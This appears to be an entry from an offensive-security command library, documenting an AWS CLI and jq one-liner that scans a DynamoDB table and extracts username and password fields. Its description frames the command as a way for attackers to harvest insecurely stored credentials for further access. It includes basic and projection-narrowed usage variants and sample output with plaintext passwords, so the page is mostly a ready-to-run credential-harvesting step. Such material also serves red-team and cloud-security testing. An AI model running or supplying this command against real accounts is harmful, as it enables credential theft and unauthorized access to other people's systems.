---
id: 4c6ba549-c7eb-486d-b558-01f2c6d88cf6
name: aws-dynamodb-scan-table-for-credentials
type: command
executor: bash
data: >-
  aws --endpoint-url $_ENDPOINT_URL dynamodb scan --table-name $_TABLE_NAME | jq
  -r '.Items[] | {username: .username.S, password: .password.S} // empty'
output: null
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - AWS
tags:
  - cloud
  - aws
  - dynamodb
verified: true
validated: true
---

# aws-dynamodb-scan-table-for-credentials

## Command

```bash
aws --endpoint-url $_ENDPOINT_URL dynamodb scan --table-name $_TABLE_NAME | jq -r '.Items[] | {username: .username.S, password: .password.S} // empty'
```

## Description

This command scans a specified DynamoDB table using the AWS CLI and parses the output with jq to extract username and password fields from items. It is used in scenarios where credentials are stored insecurely in DynamoDB, allowing attackers to harvest them for further access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ENDPOINT_URL | Custom endpoint URL for DynamoDB (e.g., local mock or regional endpoint like https://dynamodb.us-east-1.amazonaws.com) | Yes |
| $_TABLE_NAME | Name of the DynamoDB table to scan (e.g., 'users') | Yes |
| --table-name | Specifies the target table for the scan operation | Yes (via $_TABLE_NAME) |
| jq -r '.Items[] | {username: .username.S, password: .password.S} // empty' | Filters JSON output to display only username and password strings, suppressing empty results | Yes |

## Examples

### Basic Usage

```bash
aws --endpoint-url http://localhost:8000 dynamodb scan --table-name users | jq -r '.Items[] | {username: .username.S, password: .password.S} // empty'
```

### Advanced Usage

For a specific projection (only credential attributes) to reduce data transfer:

```bash
aws --endpoint-url $_ENDPOINT_URL dynamodb scan --table-name $_TABLE_NAME --projection-expression 'username,password' | jq -r '.Items[] | {username: .username.S, password: .password.S} // empty'
```

## Expected Output

Successful execution returns extracted credentials in a readable format, such as:

```
{
  "username": "Mgmt",
  "password": "Management@#1@#"
}
{
  "username": "user2",
  "password": "pass123"
}
```

If no matching fields are found, the output is empty. Errors may include 'AccessDeniedException' if permissions are insufficient.

## Related

- [[procedures/Scan-DynamoDB-Table-for-Credentials]] (procedure that uses this command)
- [[commands/aws-dynamodb-list-tables]] (related command for prerequisite verification)
